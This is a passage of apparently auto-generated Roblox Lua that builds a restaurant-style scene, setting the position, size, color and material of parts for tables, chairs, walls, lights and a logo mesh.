        Part444.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part444.Anchored = true
        Part444.BottomSurface = Enum.SurfaceType.Smooth
        Part444.BrickColor = BrickColor.new("Reddish brown")
        Part444.Material = Enum.Material.Wood
        Part444.TopSurface = Enum.SurfaceType.Smooth
        Part444.brickColor = BrickColor.new("Reddish brown")
        Part445.Parent = Model436
        Part445.CFrame = CFrame.new(3.09996629, 11856.751, -16.8999996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part445.Position = Vector3.new(3.099966287612915, 11856.7509765625, -16.899999618530273)
        Part445.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part445.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part445.Anchored = true
        Part445.BottomSurface = Enum.SurfaceType.Smooth
        Part445.BrickColor = BrickColor.new("Reddish brown")
        Part445.Material = Enum.Material.Wood
        Part445.TopSurface = Enum.SurfaceType.Smooth
        Part445.brickColor = BrickColor.new("Reddish brown")
        Part446.Parent = Model436
        Part446.CFrame = CFrame.new(3.09996629, 11854.6504, -19.0999985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part446.Position = Vector3.new(3.099966287612915, 11854.650390625, -19.099998474121094)
        Part446.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part446.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part446.Anchored = true
        Part446.BottomSurface = Enum.SurfaceType.Smooth
        Part446.BrickColor = BrickColor.new("Reddish brown")
        Part446.Material = Enum.Material.Wood
        Part446.TopSurface = Enum.SurfaceType.Smooth
        Part446.brickColor = BrickColor.new("Reddish brown")
        Part447.Parent = Model436
        Part447.CFrame = CFrame.new(3.09996438, 11856.251, -17.9999924, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part447.Position = Vector3.new(3.0999643802642822, 11856.2509765625, -17.99999237060547)
        Part447.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part447.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part447.Anchored = true
        Part447.BottomSurface = Enum.SurfaceType.Smooth
        Part447.BrickColor = BrickColor.new("Reddish brown")
        Part447.Material = Enum.Material.Wood
        Part447.TopSurface = Enum.SurfaceType.Smooth
        Part447.brickColor = BrickColor.new("Reddish brown")
        Part448.Parent = Model436
        Part448.CFrame = CFrame.new(0.899967849, 11854.6504, -16.9000015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part448.Position = Vector3.new(0.8999678492546082, 11854.650390625, -16.900001525878906)
        Part448.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part448.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part448.Anchored = true
        Part448.BottomSurface = Enum.SurfaceType.Smooth
        Part448.BrickColor = BrickColor.new("Reddish brown")
        Part448.Material = Enum.Material.Wood
        Part448.TopSurface = Enum.SurfaceType.Smooth
        Part448.brickColor = BrickColor.new("Reddish brown")
        Part449.Parent = Model436
        Part449.CFrame = CFrame.new(1.99997163, 11855.4502, -17.9999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part449.Position = Vector3.new(1.999971628189087, 11855.4501953125, -17.999990463256836)
        Part449.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part449.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part449.Anchored = true
        Part449.BottomSurface = Enum.SurfaceType.Smooth
        Part449.BrickColor = BrickColor.new("Reddish brown")
        Part449.Material = Enum.Material.Wood
        Part449.TopSurface = Enum.SurfaceType.Smooth
        Part449.brickColor = BrickColor.new("Reddish brown")
        Part450.Parent = Model436
        Part450.CFrame = CFrame.new(3.09996629, 11854.6504, -16.8999996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part450.Position = Vector3.new(3.099966287612915, 11854.650390625, -16.899999618530273)
        Part450.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part450.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part450.Anchored = true
        Part450.BottomSurface = Enum.SurfaceType.Smooth
        Part450.BrickColor = BrickColor.new("Reddish brown")
        Part450.Material = Enum.Material.Wood
        Part450.TopSurface = Enum.SurfaceType.Smooth
        Part450.brickColor = BrickColor.new("Reddish brown")
        Model451.Name = "Table"
        Model451.Parent = Model399
        Model452.Name = "Chair"
        Model452.Parent = Model451
        Part453.Parent = Model452
        Part453.CFrame = CFrame.new(-2.50000191, 11854.6504, -16.8999844, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part453.Orientation = Vector3.new(0, 180, 0)
        Part453.Position = Vector3.new(-2.500001907348633, 11854.650390625, -16.89998435974121)
        Part453.Rotation = Vector3.new(-180, 0, -180)
        Part453.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part453.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part453.Anchored = true
        Part453.BottomSurface = Enum.SurfaceType.Smooth
        Part453.BrickColor = BrickColor.new("Reddish brown")
        Part453.Material = Enum.Material.Wood
        Part453.TopSurface = Enum.SurfaceType.Smooth
        Part453.brickColor = BrickColor.new("Reddish brown")
        Seat454.Parent = Model452
        Seat454.CFrame = CFrame.new(-3.60000682, 11855.4502, -17.9999905, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Seat454.Orientation = Vector3.new(0, -90, 0)
        Seat454.Position = Vector3.new(-3.6000068187713623, 11855.4501953125, -17.999990463256836)
        Seat454.Rotation = Vector3.new(0, -90, 0)
        Seat454.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat454.Transparency = 1
        Seat454.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat454.Anchored = true
        Seat454.BottomSurface = Enum.SurfaceType.Smooth
        Seat454.BrickColor = BrickColor.new("Reddish brown")
        Seat454.Material = Enum.Material.Wood
        Seat454.TopSurface = Enum.SurfaceType.Smooth
        Seat454.brickColor = BrickColor.new("Reddish brown")
        Part455.Parent = Model452
        Part455.CFrame = CFrame.new(-4.69999933, 11855.8506, -17.9999886, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part455.Orientation = Vector3.new(0, 180, 0)
        Part455.Position = Vector3.new(-4.6999993324279785, 11855.8505859375, -17.999988555908203)
        Part455.Rotation = Vector3.new(-180, 0, -180)
        Part455.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part455.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part455.Anchored = true
        Part455.BottomSurface = Enum.SurfaceType.Smooth
        Part455.BrickColor = BrickColor.new("Reddish brown")
        Part455.Material = Enum.Material.Wood
        Part455.TopSurface = Enum.SurfaceType.Smooth
        Part455.brickColor = BrickColor.new("Reddish brown")
        Part456.Parent = Model452
        Part456.CFrame = CFrame.new(-4.69999933, 11857.0498, -17.9999886, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part456.Orientation = Vector3.new(0, 180, 0)
        Part456.Position = Vector3.new(-4.6999993324279785, 11857.0498046875, -17.999988555908203)
        Part456.Rotation = Vector3.new(-180, 0, -180)
        Part456.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part456.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part456.Anchored = true
        Part456.BottomSurface = Enum.SurfaceType.Smooth
        Part456.BrickColor = BrickColor.new("Reddish brown")
        Part456.Material = Enum.Material.Wood
        Part456.TopSurface = Enum.SurfaceType.Smooth
        Part456.brickColor = BrickColor.new("Reddish brown")
        Part457.Parent = Model452
        Part457.CFrame = CFrame.new(-4.69999933, 11856.6504, -17.9999886, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part457.Orientation = Vector3.new(0, 180, 0)
        Part457.Position = Vector3.new(-4.6999993324279785, 11856.650390625, -17.999988555908203)
        Part457.Rotation = Vector3.new(-180, 0, -180)
        Part457.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part457.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part457.Anchored = true
        Part457.BottomSurface = Enum.SurfaceType.Smooth
        Part457.BrickColor = BrickColor.new("Reddish brown")
        Part457.Material = Enum.Material.Wood
        Part457.TopSurface = Enum.SurfaceType.Smooth
        Part457.brickColor = BrickColor.new("Reddish brown")
        Part458.Parent = Model452
        Part458.CFrame = CFrame.new(-4.69999933, 11857.4502, -17.9999886, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part458.Orientation = Vector3.new(0, 180, 0)
        Part458.Position = Vector3.new(-4.6999993324279785, 11857.4501953125, -17.999988555908203)
        Part458.Rotation = Vector3.new(-180, 0, -180)
        Part458.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part458.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part458.Anchored = true
        Part458.BottomSurface = Enum.SurfaceType.Smooth
        Part458.BrickColor = BrickColor.new("Reddish brown")
        Part458.Material = Enum.Material.Wood
        Part458.TopSurface = Enum.SurfaceType.Smooth
        Part458.brickColor = BrickColor.new("Reddish brown")
        Part459.Parent = Model452
        Part459.CFrame = CFrame.new(-4.69999933, 11857.8506, -17.9999886, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part459.Orientation = Vector3.new(0, 180, 0)
        Part459.Position = Vector3.new(-4.6999993324279785, 11857.8505859375, -17.999988555908203)
        Part459.Rotation = Vector3.new(-180, 0, -180)
        Part459.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part459.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part459.Anchored = true
        Part459.BottomSurface = Enum.SurfaceType.Smooth
        Part459.BrickColor = BrickColor.new("Reddish brown")
        Part459.Material = Enum.Material.Wood
        Part459.TopSurface = Enum.SurfaceType.Smooth
        Part459.brickColor = BrickColor.new("Reddish brown")
        Part460.Parent = Model452
        Part460.CFrame = CFrame.new(-4.70000076, 11856.751, -16.8999825, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part460.Orientation = Vector3.new(0, 180, 0)
        Part460.Position = Vector3.new(-4.700000762939453, 11856.7509765625, -16.899982452392578)
        Part460.Rotation = Vector3.new(-180, 0, -180)
        Part460.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part460.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part460.Anchored = true
        Part460.BottomSurface = Enum.SurfaceType.Smooth
        Part460.BrickColor = BrickColor.new("Reddish brown")
        Part460.Material = Enum.Material.Wood
        Part460.TopSurface = Enum.SurfaceType.Smooth
        Part460.brickColor = BrickColor.new("Reddish brown")
        Part461.Parent = Model452
        Part461.CFrame = CFrame.new(-4.70000029, 11856.751, -19.0999832, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part461.Orientation = Vector3.new(0, 180, 0)
        Part461.Position = Vector3.new(-4.700000286102295, 11856.7509765625, -19.09998321533203)
        Part461.Rotation = Vector3.new(-180, 0, -180)
        Part461.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part461.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part461.Anchored = true
        Part461.BottomSurface = Enum.SurfaceType.Smooth
        Part461.BrickColor = BrickColor.new("Reddish brown")
        Part461.Material = Enum.Material.Wood
        Part461.TopSurface = Enum.SurfaceType.Smooth
        Part461.brickColor = BrickColor.new("Reddish brown")
        Part462.Parent = Model452
        Part462.CFrame = CFrame.new(-4.70000076, 11854.6504, -16.8999825, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part462.Orientation = Vector3.new(0, 180, 0)
        Part462.Position = Vector3.new(-4.700000762939453, 11854.650390625, -16.899982452392578)
        Part462.Rotation = Vector3.new(-180, 0, -180)
        Part462.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part462.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part462.Anchored = true
        Part462.BottomSurface = Enum.SurfaceType.Smooth
        Part462.BrickColor = BrickColor.new("Reddish brown")
        Part462.Material = Enum.Material.Wood
        Part462.TopSurface = Enum.SurfaceType.Smooth
        Part462.brickColor = BrickColor.new("Reddish brown")
        Part463.Parent = Model452
        Part463.CFrame = CFrame.new(-4.69999933, 11856.251, -17.9999886, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part463.Orientation = Vector3.new(0, 180, 0)
        Part463.Position = Vector3.new(-4.6999993324279785, 11856.2509765625, -17.999988555908203)
        Part463.Rotation = Vector3.new(-180, 0, -180)
        Part463.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part463.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part463.Anchored = true
        Part463.BottomSurface = Enum.SurfaceType.Smooth
        Part463.BrickColor = BrickColor.new("Reddish brown")
        Part463.Material = Enum.Material.Wood
        Part463.TopSurface = Enum.SurfaceType.Smooth
        Part463.brickColor = BrickColor.new("Reddish brown")
        Part464.Parent = Model452
        Part464.CFrame = CFrame.new(-2.50000191, 11854.6504, -19.0999813, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part464.Orientation = Vector3.new(0, 180, 0)
        Part464.Position = Vector3.new(-2.500001907348633, 11854.650390625, -19.0999813079834)
        Part464.Rotation = Vector3.new(-180, 0, -180)
        Part464.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part464.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part464.Anchored = true
        Part464.BottomSurface = Enum.SurfaceType.Smooth
        Part464.BrickColor = BrickColor.new("Reddish brown")
        Part464.Material = Enum.Material.Wood
        Part464.TopSurface = Enum.SurfaceType.Smooth
        Part464.brickColor = BrickColor.new("Reddish brown")
        Part465.Parent = Model452
        Part465.CFrame = CFrame.new(-3.60000682, 11855.4502, -17.9999905, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part465.Orientation = Vector3.new(0, 180, 0)
        Part465.Position = Vector3.new(-3.6000068187713623, 11855.4501953125, -17.999990463256836)
        Part465.Rotation = Vector3.new(-180, 0, -180)
        Part465.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part465.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part465.Anchored = true
        Part465.BottomSurface = Enum.SurfaceType.Smooth
        Part465.BrickColor = BrickColor.new("Reddish brown")
        Part465.Material = Enum.Material.Wood
        Part465.TopSurface = Enum.SurfaceType.Smooth
        Part465.brickColor = BrickColor.new("Reddish brown")
        Part466.Parent = Model452
        Part466.CFrame = CFrame.new(-4.70000029, 11854.6504, -19.0999832, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part466.Orientation = Vector3.new(0, 180, 0)
        Part466.Position = Vector3.new(-4.700000286102295, 11854.650390625, -19.09998321533203)
        Part466.Rotation = Vector3.new(-180, 0, -180)
        Part466.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part466.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part466.Anchored = true
        Part466.BottomSurface = Enum.SurfaceType.Smooth
        Part466.BrickColor = BrickColor.new("Reddish brown")
        Part466.Material = Enum.Material.Wood
        Part466.TopSurface = Enum.SurfaceType.Smooth
        Part466.brickColor = BrickColor.new("Reddish brown")
        Part467.Parent = Model0
        Part467.CFrame = CFrame.new(-6.89999962, 11870.4004, 22.5499992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part467.Position = Vector3.new(-6.899999618530273, 11870.400390625, 22.549999237060547)
        Part467.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part467.Size = Vector3.new(0.19999989867210388, 1.5, 19.100000381469727)
        Part467.Anchored = true
        Part467.BottomSurface = Enum.SurfaceType.Smooth
        Part467.BrickColor = BrickColor.new("Dark stone grey")
        Part467.Material = Enum.Material.SmoothPlastic
        Part467.TopSurface = Enum.SurfaceType.Smooth
        Part467.brickColor = BrickColor.new("Dark stone grey")
        Part468.Parent = Model0
        Part468.CFrame = CFrame.new(-6.85000038, 11869.1504, 22.5499992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part468.Position = Vector3.new(-6.850000381469727, 11869.150390625, 22.549999237060547)
        Part468.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part468.Size = Vector3.new(0.09999990463256836, 1, 19.100000381469727)
        Part468.Anchored = true
        Part468.BottomSurface = Enum.SurfaceType.Smooth
        Part468.BrickColor = BrickColor.new("Dark stone grey")
        Part468.Material = Enum.Material.SmoothPlastic
        Part468.TopSurface = Enum.SurfaceType.Smooth
        Part468.brickColor = BrickColor.new("Dark stone grey")
        Part469.Parent = Model0
        Part469.CFrame =
            CFrame.new(
            -12.149992,
            11872.6504,
            5.60001469,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part469.Orientation = Vector3.new(0, 90, 0)
        Part469.Position = Vector3.new(-12.149991989135742, 11872.650390625, 5.600014686584473)
        Part469.Rotation = Vector3.new(0, 90, 0)
        Part469.Color = Color3.new(1, 0, 0)
        Part469.Size = Vector3.new(14.800000190734863, 3, 10.300000190734863)
        Part469.Anchored = true
        Part469.BottomSurface = Enum.SurfaceType.Smooth
        Part469.BrickColor = BrickColor.new("Really red")
        Part469.Material = Enum.Material.SmoothPlastic
        Part469.TopSurface = Enum.SurfaceType.Smooth
        Part469.brickColor = BrickColor.new("Really red")
        Part470.Parent = Model0
        Part470.CFrame = CFrame.new(-12.1499996, 11867.8506, 13.0500116, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part470.Orientation = Vector3.new(0, 180, 0)
        Part470.Position = Vector3.new(-12.149999618530273, 11867.8505859375, 13.05001163482666)
        Part470.Rotation = Vector3.new(-180, 0, -180)
        Part470.Color = Color3.new(1, 0, 0)
        Part470.Size = Vector3.new(4.5, 12.59999942779541, 0.10000000149011612)
        Part470.Anchored = true
        Part470.BottomSurface = Enum.SurfaceType.Smooth
        Part470.BrickColor = BrickColor.new("Really red")
        Part470.Material = Enum.Material.SmoothPlastic
        Part470.TopSurface = Enum.SurfaceType.Smooth
        Part470.brickColor = BrickColor.new("Really red")
        Part471.Parent = Model0
        Part471.CFrame = CFrame.new(22.9999962, 11855.7998, 32.0500107, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part471.Position = Vector3.new(22.999996185302734, 11855.7998046875, 32.050010681152344)
        Part471.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part471.Size = Vector3.new(59.79999923706055, 3.6999998092651367, 0.10000000149011612)
        Part471.Anchored = true
        Part471.BottomSurface = Enum.SurfaceType.Smooth
        Part471.BrickColor = BrickColor.new("Mid gray")
        Part471.Material = Enum.Material.Cobblestone
        Part471.TopSurface = Enum.SurfaceType.Smooth
        Part471.brickColor = BrickColor.new("Mid gray")
        Part472.Parent = Model0
        Part472.CFrame = CFrame.new(11.9999952, 11856.6504, 11.4500093, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part472.Orientation = Vector3.new(0, -90, 0)
        Part472.Position = Vector3.new(11.999995231628418, 11856.650390625, 11.4500093460083)
        Part472.Rotation = Vector3.new(0, -90, 0)
        Part472.Color = Color3.new(0.992157, 0.917647, 0.552941)
        Part472.Size = Vector3.new(3.0999999046325684, 1, 2.1999998092651367)
        Part472.Anchored = true
        Part472.BottomSurface = Enum.SurfaceType.Smooth
        Part472.BrickColor = BrickColor.new("Cool yellow")
        Part472.Material = Enum.Material.SmoothPlastic
        Part472.TopSurface = Enum.SurfaceType.Smooth
        Part472.brickColor = BrickColor.new("Cool yellow")
        Part473.Parent = Model0
        Part473.CFrame = CFrame.new(11.9999952, 11855.751, 11.5000086, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part473.Orientation = Vector3.new(0, -90, 0)
        Part473.Position = Vector3.new(11.999995231628418, 11855.7509765625, 11.500008583068848)
        Part473.Rotation = Vector3.new(0, -90, 0)
        Part473.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part473.Size = Vector3.new(3, 3.5999999046325684, 2)
        Part473.Anchored = true
        Part473.BottomSurface = Enum.SurfaceType.Smooth
        Part473.BrickColor = BrickColor.new("Really black")
        Part473.Material = Enum.Material.SmoothPlastic
        Part473.TopSurface = Enum.SurfaceType.Smooth
        Part473.brickColor = BrickColor.new("Really black")
        Part474.Parent = Model0
        Part474.CFrame = CFrame.new(12.9499979, 11859.2998, 22.4500122, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part474.Position = Vector3.new(12.949997901916504, 11859.2998046875, 22.45001220703125)
        Part474.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part474.Size = Vector3.new(0.09999847412109375, 10.699999809265137, 18.899999618530273)
        Part474.Anchored = true
        Part474.BottomSurface = Enum.SurfaceType.Smooth
        Part474.BrickColor = BrickColor.new("White")
        Part474.Material = Enum.Material.Wood
        Part474.TopSurface = Enum.SurfaceType.Smooth
        Part474.brickColor = BrickColor.new("White")
        Part475.Parent = Model0
        Part475.CFrame = CFrame.new(-2.25000191, 11862.4502, 12.9500132, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part475.Position = Vector3.new(-2.250001907348633, 11862.4501953125, 12.950013160705566)
        Part475.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part475.Size = Vector3.new(3.0999999046325684, 1.399999976158142, 0.10000000149011612)
        Part475.Anchored = true
        Part475.BottomSurface = Enum.SurfaceType.Smooth
        Part475.BrickColor = BrickColor.new("White")
        Part475.TopSurface = Enum.SurfaceType.Smooth
        Part475.brickColor = BrickColor.new("White")
        Decal476.Name = "Bathroom"
        Decal476.Parent = Part475
        Decal476.Texture = "http://www.roblox.com/asset/?id=336973453"
        Part477.Parent = Model0
        Part477.CFrame = CFrame.new(-2.25000191, 11863.1006, 13.0500116, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part477.Position = Vector3.new(-2.250001907348633, 11863.1005859375, 13.05001163482666)
        Part477.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part477.Size = Vector3.new(4.499997138977051, 3.09999942779541, 0.10000000149011612)
        Part477.Anchored = true
        Part477.BottomSurface = Enum.SurfaceType.Smooth
        Part477.BrickColor = BrickColor.new("White")
        Part477.Material = Enum.Material.Wood
        Part477.TopSurface = Enum.SurfaceType.Smooth
        Part477.brickColor = BrickColor.new("White")
        Part478.Parent = Model0
        Part478.CFrame = CFrame.new(-0.0499973297, 11857.7002, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part478.Position = Vector3.new(-0.04999732971191406, 11857.7001953125, 13.050023078918457)
        Part478.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part478.Size = Vector3.new(0.09999990463256836, 7.5, 0.10000000149011612)
        Part478.Anchored = true
        Part478.BottomSurface = Enum.SurfaceType.Smooth
        Part478.BrickColor = BrickColor.new("Really black")
        Part478.Material = Enum.Material.SmoothPlastic
        Part478.TopSurface = Enum.SurfaceType.Smooth
        Part478.brickColor = BrickColor.new("Really black")
        Part479.Parent = Model0
        Part479.CFrame = CFrame.new(-2.24999809, 11861.501, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part479.Position = Vector3.new(-2.249998092651367, 11861.5009765625, 13.050023078918457)
        Part479.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part479.Size = Vector3.new(4.5, 0.09999990463256836, 0.10000000149011612)
        Part479.Anchored = true
        Part479.BottomSurface = Enum.SurfaceType.Smooth
        Part479.BrickColor = BrickColor.new("Really black")
        Part479.Material = Enum.Material.SmoothPlastic
        Part479.TopSurface = Enum.SurfaceType.Smooth
        Part479.brickColor = BrickColor.new("Really black")
        Part480.Name = "Light"
        Part480.Parent = Model0
        Part480.CFrame = CFrame.new(2.8999958, 11864.4502, 22.0000076, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part480.Position = Vector3.new(2.899995803833008, 11864.4501953125, 22.00000762939453)
        Part480.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part480.Transparency = 1
        Part480.Size = Vector3.new(1, 1, 1)
        Part480.Anchored = true
        Part480.BottomSurface = Enum.SurfaceType.Smooth
        Part480.BrickColor = BrickColor.new("Bright yellow")
        Part480.Material = Enum.Material.ForceField
        Part480.TopSurface = Enum.SurfaceType.Smooth
        Part480.brickColor = BrickColor.new("Bright yellow")
        PointLight481.Parent = Part480
        PointLight481.Range = 20
        PointLight481.Shadows = true
        Part482.Name = "Light"
        Part482.Parent = Model0
        Part482.CFrame = CFrame.new(-17.7500057, 11870.3506, 5.80001163, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part482.Position = Vector3.new(-17.7500057220459, 11870.3505859375, 5.80001163482666)
        Part482.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part482.Transparency = 1
        Part482.Size = Vector3.new(1, 1, 1)
        Part482.Anchored = true
        Part482.BottomSurface = Enum.SurfaceType.Smooth
        Part482.BrickColor = BrickColor.new("Bright yellow")
        Part482.Material = Enum.Material.ForceField
        Part482.TopSurface = Enum.SurfaceType.Smooth
        Part482.brickColor = BrickColor.new("Bright yellow")
        PointLight483.Parent = Part482
        PointLight483.Range = 20
        PointLight483.Shadows = true
        MeshPart484.Name = "McDonalds Logo"
        MeshPart484.Parent = Model0
        MeshPart484.CFrame = CFrame.new(-17.6250057, 11869.501, 5.7500124, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        MeshPart484.Orientation = Vector3.new(0, 90, 0)
        MeshPart484.Position = Vector3.new(-17.6250057220459, 11869.5009765625, 5.750012397766113)
        MeshPart484.Rotation = Vector3.new(0, 90, 0)
        MeshPart484.Color = Color3.new(1, 0.764706, 0)
        MeshPart484.Size = Vector3.new(7.300000190734863, 6.5, 0.44999998807907104)
        MeshPart484.Anchored = true
        MeshPart484.BrickColor = BrickColor.new("Deep orange")
        MeshPart484.Material = Enum.Material.SmoothPlastic
        MeshPart484.brickColor = BrickColor.new("Deep orange")
        Part485.Parent = Model0
        Part485.CFrame = CFrame.new(-7.05000496, 11861.501, 5.65000629, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part485.Position = Vector3.new(-7.050004959106445, 11861.5009765625, 5.650006294250488)
        Part485.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part485.Size = Vector3.new(0.09999990463256836, 0.09999942779541016, 9.100000381469727)
        Part485.Anchored = true
        Part485.BottomSurface = Enum.SurfaceType.Smooth
        Part485.BrickColor = BrickColor.new("Really black")
        Part485.Material = Enum.Material.SmoothPlastic
        Part485.TopSurface = Enum.SurfaceType.Smooth
        Part485.brickColor = BrickColor.new("Really black")
        Part486.Parent = Model0
        Part486.CFrame = CFrame.new(-7.05000496, 11863.1006, 5.65000629, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part486.Position = Vector3.new(-7.050004959106445, 11863.1005859375, 5.650006294250488)
        Part486.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part486.Size = Vector3.new(0.09999990463256836, 3.0999999046325684, 9.100000381469727)
        Part486.Anchored = true
        Part486.BottomSurface = Enum.SurfaceType.Smooth
        Part486.BrickColor = BrickColor.new("White")
        Part486.Material = Enum.Material.SmoothPlastic
        Part486.TopSurface = Enum.SurfaceType.Smooth
        Part486.brickColor = BrickColor.new("White")
        Part487.Parent = Model0
        Part487.CFrame = CFrame.new(-7.05000496, 11861.0498, -0.349993706, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part487.Orientation = Vector3.new(0, 90, 0)
        Part487.Position = Vector3.new(-7.050004959106445, 11861.0498046875, -0.3499937057495117)
        Part487.Rotation = Vector3.new(0, 90, 0)
        Part487.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part487.Size = Vector3.new(2.9000000953674316, 7.199999809265137, 0.10000000149011612)
        Part487.Anchored = true
        Part487.BottomSurface = Enum.SurfaceType.Smooth
        Part487.BrickColor = BrickColor.new("White")
        Part487.Material = Enum.Material.SmoothPlastic
        Part487.TopSurface = Enum.SurfaceType.Smooth
        Part487.brickColor = BrickColor.new("White")
        Part488.Parent = Model0
        Part488.CFrame = CFrame.new(-8.44999981, 11872.6504, 13.0500059, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part488.Orientation = Vector3.new(0, 180, 0)
        Part488.Position = Vector3.new(-8.449999809265137, 11872.650390625, 13.050005912780762)
        Part488.Rotation = Vector3.new(-180, 0, -180)
        Part488.Color = Color3.new(1, 0, 0)
        Part488.Size = Vector3.new(2.9000000953674316, 3, 0.10000000149011612)
        Part488.Anchored = true
        Part488.BottomSurface = Enum.SurfaceType.Smooth
        Part488.BrickColor = BrickColor.new("Really red")
        Part488.Material = Enum.Material.SmoothPlastic
        Part488.TopSurface = Enum.SurfaceType.Smooth
        Part488.brickColor = BrickColor.new("Really red")
        Part489.Parent = Model0
        Part489.CFrame = CFrame.new(-15.8500004, 11869.6504, -1.84998989, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part489.Orientation = Vector3.new(0, 180, 0)
        Part489.Position = Vector3.new(-15.850000381469727, 11869.650390625, -1.849989891052246)
        Part489.Rotation = Vector3.new(-180, 0, -180)
        Part489.Color = Color3.new(1, 0, 0)
        Part489.Size = Vector3.new(2.9000000953674316, 9, 0.10000000149011612)
        Part489.Anchored = true
        Part489.BottomSurface = Enum.SurfaceType.Smooth
        Part489.BrickColor = BrickColor.new("Really red")
        Part489.Material = Enum.Material.SmoothPlastic
        Part489.TopSurface = Enum.SurfaceType.Smooth
        Part489.brickColor = BrickColor.new("Really red")
        Part490.Parent = Model0
        Part490.CFrame = CFrame.new(-17.3500042, 11869.6504, 5.60001087, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part490.Orientation = Vector3.new(0, 90, 0)
